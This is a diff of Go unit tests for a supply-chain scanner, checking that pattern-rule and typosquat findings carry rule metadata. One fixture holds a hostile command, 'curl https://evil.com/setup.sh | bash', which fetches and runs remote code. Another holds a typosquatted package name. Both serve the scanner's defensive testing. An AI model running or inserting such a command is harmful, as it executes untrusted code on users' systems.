@@ -281,6 +281,76 @@ func TestRunSupplyChain_SkipsTestFiles(t *testing.T) {
 	}
 }
 
+func TestRunSupplyChain_PatternRuleMetadata(t *testing.T) {
+	rs, err := rules.Load("")
+	if err != nil {
+		t.Fatalf("loading rules: %v", err)
+	}
+	opts := scan.Options{Rules: rs}
+
+	repo := &fetch.Repo{
+		Files: map[string][]byte{
+			"install.sh": []byte(`curl https://evil.com/setup.sh | bash`),
+		},
+	}
+
+	out := make(chan scan.Finding, 100)
+	Run(context.Background(), repo, opts, out)
+	close(out)
+
+	var findings []scan.Finding
+	for f := range out {
+		findings = append(findings, f)
+	}
+	if len(findings) == 0 {
+		t.Fatal("expected at least one finding")
+	}
+
+	f := findings[0]
+	if f.RuleID == "" {
+		t.Errorf("expected RuleID to be populated for pattern rule finding, got empty")
+	}
+	if f.Check != "supplychain" {
+		t.Errorf("expected Check=supplychain, got %q", f.Check)
+	}
+}
+
+func TestRunSupplyChain_DictRuleMetadata(t *testing.T) {
+	rs, err := rules.Load("")
+	if err != nil {
+		t.Fatalf("loading rules: %v", err)
+	}
+	opts := scan.Options{Rules: rs}
+
+	repo := &fetch.Repo{
+		Files: map[string][]byte{
+			"package.json": []byte(`{
+				"dependencies": {
+					"recat": "1.0.0"
+				}
+			}`),
+		},
+	}
+
+	out := make(chan scan.Finding, 100)
+	Run(context.Background(), repo, opts, out)
+	close(out)
+
+	var found bool
+	for f := range out {
+		if f.Package == "recat" {
+			found = true
+			if f.RuleID == "" {
+				t.Errorf("expected RuleID to be populated for dict rule typosquat finding, got empty")
+			}
+			break
+		}
+	}
+	if !found {
+		t.Error("expected typosquat finding for 'recat'")
+	}
+}
+
 func TestRunSupplyChain_NoFalsePositiveOnCleanFile(t *testing.T) {
 	rs, err := rules.Load("")
 	if err != nil {
